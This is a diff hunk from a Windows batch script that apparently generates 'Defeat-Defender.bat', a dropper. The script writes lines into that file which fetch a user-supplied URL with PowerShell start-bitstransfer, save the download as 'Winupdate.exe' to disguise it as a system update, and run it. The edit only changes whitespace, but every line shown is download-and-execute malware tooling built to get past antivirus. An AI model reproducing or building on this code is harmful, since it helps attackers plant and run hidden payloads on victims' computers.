@@ -18,7 +18,7 @@ EXIT /B %ERRORLEVEL%
 echo.
 echo Your  Url is :  %a% 
 echo. >>Defeat-Defender.bat
-echo powershell -command "start-bitstransfer %a%   .\Winupdate.exe" >>Defeat-Defender.bat
+echo powershell -command "start-bitstransfer %a%  .\Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo start  Winupdate.exe >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
